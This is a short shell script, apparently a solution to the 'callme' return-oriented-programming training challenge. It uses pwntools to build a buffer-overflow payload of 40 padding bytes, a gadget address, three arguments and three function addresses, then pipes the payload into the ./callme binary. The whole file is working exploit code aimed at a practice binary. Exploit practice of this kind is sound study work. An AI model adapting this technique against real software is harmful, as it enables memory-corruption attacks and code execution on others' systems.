#!/bin/sh
python -c '
from pwn import *;

ovf = "A" * 40
f_args = p64(0x1) + p64(0x2) + p64(0x3);
f1 = p64(0x401850)
f2 = p64(0x401870)
f3 = p64(0x401810)
rop = p64(0x401ab0)

print("A"*40 + rop + f_args + f1 + rop + f_args + f2 + rop + f_args + f3)
' > input.bin
cat input.bin | ./callme